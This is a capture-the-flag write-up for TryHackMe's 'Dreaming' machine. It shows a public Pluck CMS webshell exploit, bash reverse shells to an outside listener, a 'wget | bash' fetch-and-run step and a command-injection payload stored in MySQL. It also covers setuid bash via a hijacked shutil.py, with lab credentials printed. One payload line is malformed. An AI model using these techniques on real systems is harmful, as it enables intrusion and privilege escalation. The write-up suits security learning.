# TryHackMe - Dreaming (Write-Up)

_7 min read · May 9, 2026 · by qs18_

---

## Entry Log

In this mini-blog, I’ll be showing you the walkthrough for [**Dreaming**](https://tryhackme.com/room/dreaming) machine from [**TryHackMe**](https://tryhackme.com/).

- Goal: Obtain Lucien, Death and Morpheus Flags
- Difficulty: Easy
- Machine Author: b1d0ws and tokyo

---

## Scanning for Open Ports

Machine IP: 10.49.149.56.

As usual, I started with an [**Nmap**](https://www.kali.org/tools/nmap/) scan:

```bash
nmap -T4 -p- 10.49.149.56
sudo nmap -sCV -p 22,80 10.49.149.56
```

![Nmap Output](./img/thm-dreaming/Nmap-output.png)

From the scan result, I noticed that:

- SSH (port 22) is open.
- HTTP (port 80) is open.

As usual, I checked the site first. However, it was just a default Apache2 Ubuntu page.

---

## Futher Enumeration on the Website

Next, I used [**Gobuster**](https://www.kali.org/tools/gobuster/) to enumerate directories.

```bash
gobuster dir -u 10.49.149.56 -w /usr/share/wordlists/dirb/big.txt -t 100
```

![Gobuster Output](./img/thm-dreaming/gobuster-output.png)

I found `/app`, and inside it I accessed `pluck-4.7.13/`.

![Dreaming: Website](./img/thm-dreaming/web.png)

From here, I noticed it's running Pluck CMS version 4.7.13.

---

## Exploitation

I clicked the `admin` hyperlink and got redirected to a login page.

![Dreaming: Login](./img/thm-dreaming/web-login.png)

I tried `password` as the password and fortunately it worked.

![Dreaming: Pluck](./img/thm-dreaming/web-pluck.png)

Inside, there is a file upload feature. However, uploaded `.php` files get renamed to `.txt`, so direct upload RCE was not possible.

![Uploaded File](./img/thm-dreaming/uploaded-file.png)

I then searched for `pluck 4.7.13 exploit db` and found [Pluck CMS 4.7.13 - File Upload Remote Code Execution (Authenticated)](https://www.exploit-db.com/exploits/49909).

I copied it to my current working directory:

```bash
searchsploit 49909 -m
```

After some times of figuring out how to use it, I finally got it working:

```bash
python3 49909.py 10.49.149.56 80 password /app/pluck-4.7.13
```

```output
Authentification was succesfull, uploading webshell

Uploaded Webshell to: http://10.49.149.56:80/app/pluck-4.7.13/files/shell.phar
```

I clicked the link and was able to navigate to the web shell:

![49909](./img/thm-dreaming/49909.png)

I created a reverse shell script:

```bash
#!/bin/bash
bash -i >& /dev/tcp/192.168.223.226/4418 0>&1
```

Then I started a Python HTTP server:

```bash
python3 -m http.server 8000
```

Next, I set up my [**netcat**](https://www.kali.org/tools/netcat/) listener:

```bash
nc -lvp 4418
```

Finally, through the web shell, I executed:

```bash
wget -O- http://192.168.223.226:8000/rev.sh | bash
```

I successfully gained a shell as `www-data`.

---

## Post-Exploitation (Lucien)

While enumerating the system, I found two interesting files in `/opt`:

```output
getDreams.py  test.py
```

So, `getDreams.py` retrieves data (dreamer and dream) from MySQL (dreams) and prints it using a shell command.

However, these two lines:

```output
command = f"echo {dreamer} + {dream}"
shell = subprocess.check_output(command, text=True, shell=True)
```

execute the command in a shell. This can be used for privilege escalation.

Then, `test.py` is not really that important because it just sends a login request to local CMS page and check whether the password it correct.

However, inside it I found Lucien credentials.

I then switched to Lucien:

```bash
su lucien
HeyLucien#@1999!
```

and retrieved **Lucien flag**.

```bash
cd /home/lucien
cat lucien_flag.txt
```

![Lucien Flag](./img/thm-dreaming/lucien-flag.png)

---

## Post-Exploitation (Death)

I checked Lucien's `.bash_history` and found MySQL credentials:

```output
mysql -u lucien -plucien42DBPASSWORD
```

Before I logged in to MySQL, I checked for allowed `sudo` command for Lucien:

```bash
sudo -l
```

```output
User lucien may run the following commands on ip-10-49-134-160:
    (death) NOPASSWD: /usr/bin/python3 /home/death/getDreams.py
```

This confirms that `getDreams.py` is a way for me to escalate privileges.

I ran it:

```bash
sudo -u death /usr/bin/python3 /home/death/getDreams.py
```

```output
Alice + Flying in the sky

Bob + Exploring ancient ruins

Carol + Becoming a successful entrepreneur

Dave + Becoming a professional musician
```

It worked as expected.

I then logged in to MySQL:

```bash
mysql -u lucien -p
lucien42DBPASSWORD
```

I used `library`:

```bash
show databases;
use library;
```

Then I checked for the available tables:

```bash
show tables;
```

```output
+-------------------+
| Tables_in_library |
+-------------------+
| dreams            |
+-------------------+
```

It contains the same data as before.

So I injected my malicious code:

```bash
INSERT INTO dreams (dreamer, dream)
    -> VALUES ('test', 'test; bash -c "bash -i >& /dev/tcp/192.168.223.226/4418 0>&1"');
```

```output
+---------+----------------------------------------------------------------+
| dreamer | dream                                                          |
+---------+----------------------------------------------------------------+
| Alice   | Flying in the sky                                              |
| Bob     | Exploring ancient ruins                                        |
| Carol   | Becoming a successful entrepreneur                             |
| Dave    | Becoming a professional musician                               |
| test    | test; bash -c "bash -i >& /dev/tcp/192.168.223.226/4418 0>&1"  |
+---------+----------------------------------------------------------------+
```

I set up my listener using netcat:

```bash
nc -lvp 4418
```

Then I ran `getDreams.py` again and received Death's shell.

Then I retrieved **Death flag**.

```bash
cd /home/death
cat death_flag.txt
```

![Death Flag](./img/thm-dreaming/death-flag.png)

---

## Post-Exploitation (Morpheus)

I checked again `getDreams.py` and found Death's password.

```output
DB_USER = "death"
DB_PASS = "!mementoMORI666!"
```

I checked Morpheus directory and read the `restore.py` content:

```output
from shutil import copy2 as backup

src_file = "/home/morpheus/kingdom"
dst_file = "/kingdom_backup/kingdom"

backup(src_file, dst_file)
print("The kingdom backup has been done!")
```

This script basically copies the `kingdom` file in `/morpheus` directory to `/kingdom_backup`.

Then I tried to find writable files for the Death group:

```bash
find / -group death -type f 2>/dev/null
```

```output
/usr/lib/python3.8/shutil.py
```

So I appended the payload into `shutil.py`:

```bash
echo 'import os' >> /usr/lib/python3.8/shutil.py
os.system("cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash") >> /usr/lib/python3.8/shutil.py
```

Then after a while, I ran:

```bash
/tmp/rootbash -p
```

I successfully switched to Morpheus and I retrieved the **Morpheus flag**.

```bash
cd /home/morpheus
cat morpheus_flag.txt
```

![Morpheus Flag](./img/thm-dreaming/morpheus-flag.png)

Bomba! Settleee.

---

## Session Terminated

To be honest, it was tough. From this machine, I learned how to:

- exploit authenticated file upload in Pluck CMS to gain initial shell
- extract credentials from history file and application script
- interact with MySQL databases and manipulate stored data
- leverage stored payloads to achieve command execution
- understand Python unsafe functions like `shell=True`
- abuse Python module hijacking via writable system libraries

Thank you for reading and see you next time!
